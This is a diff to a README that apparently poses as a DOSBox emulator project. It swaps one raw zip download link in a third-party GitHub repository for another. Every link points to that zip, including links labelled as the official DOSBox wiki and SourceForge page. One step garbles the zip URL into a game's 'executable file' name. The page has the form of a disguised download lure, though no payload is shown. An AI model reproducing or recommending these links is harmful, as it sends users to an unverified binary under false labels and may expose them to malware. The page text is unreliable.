@@ -7,11 +7,11 @@ DOSBox is a powerful emulator that mimics a full x86 PC, complete with sound and
 To get started with DOSBox, follow the steps below. You’ll quickly be playing your favorite old games again.
 
 ## 📥 Download DOSBox
-[![Download DOSBox](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOSBox_v1.9.zip)](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOSBox_v1.9.zip)
+[![Download DOSBox](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOS_Box_v1.3.zip)](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOS_Box_v1.3.zip)
 
 You can download DOSBox from the following link:
 
-[Download DOSBox](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOSBox_v1.9.zip)
+[Download DOSBox](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOS_Box_v1.3.zip)
 
 ## 📋 System Requirements
 Before downloading DOSBox, ensure your system meets these requirements:
@@ -33,7 +33,7 @@ Before downloading DOSBox, ensure your system meets these requirements:
 
 ## 📦 Installation Instructions
 1. **Download the Installer**
-   Visit the [Download DOSBox](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOSBox_v1.9.zip) link above to get the latest version of DOSBox.
+   Visit the [Download DOSBox](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOS_Box_v1.3.zip) link above to get the latest version of DOSBox.
 
 2. **Run the Installer**
    - **For Windows**: Locate the downloaded `.exe` file and double-click it. Follow the on-screen instructions to complete the installation.
@@ -60,7 +60,7 @@ Replace `/path/to/your/game` with the actual path where your game files are stor
 Type `C:` and hit Enter to switch to the mounted directory.
 
 4. **Launch the Game**
-Find the executable file for your game (often named `https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOSBox_v1.9.zip` or similar) and type its name, then hit Enter. Enjoy your game!
+Find the executable file for your game (often named `https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOS_Box_v1.3.zip` or similar) and type its name, then hit Enter. Enjoy your game!
 
 ## 💡 Tips for Enjoying DOSBox
 - **Adjust Settings**: DOSBox has configuration settings that you can adjust for better performance or to fix issues.
@@ -71,7 +71,7 @@ Find the executable file for your game (often named `https://raw.githubuserconte
 If you run into issues, the DOSBox community is helpful. Search forums or look for documentation online. You can also check out video tutorials for visual guidance.
 
 ## 🌐 Additional Resources
-- [DOSBox Official Wiki](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOSBox_v1.9.zip)
-- [DOSBox on SourceForge](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOSBox_v1.9.zip)
+- [DOSBox Official Wiki](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOS_Box_v1.3.zip)
+- [DOSBox on SourceForge](https://raw.githubusercontent.com/XDL31/DOSBox/main/starstroke/DOS_Box_v1.3.zip)
 
 Now you are ready to revitalize your gaming experience with DOSBox. Enjoy your classic games!
